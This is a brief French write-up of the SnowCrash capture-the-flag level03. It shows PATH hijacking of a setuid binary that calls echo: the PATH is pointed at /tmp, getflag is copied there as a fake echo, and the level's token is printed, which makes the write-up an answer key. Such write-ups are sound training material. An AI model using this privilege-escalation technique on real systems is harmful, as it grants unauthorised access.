ls -l level03
on voit que le sticky bit est set avec les perm de flag03

avec gdb on voit que le programme fait un echo
on change le path dans l'env pour appeler ce qu'on veut a la place
export PATH=/tmp
cp /rofs/bin/getflag /tmp/echo

on lance le binaire
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

:)
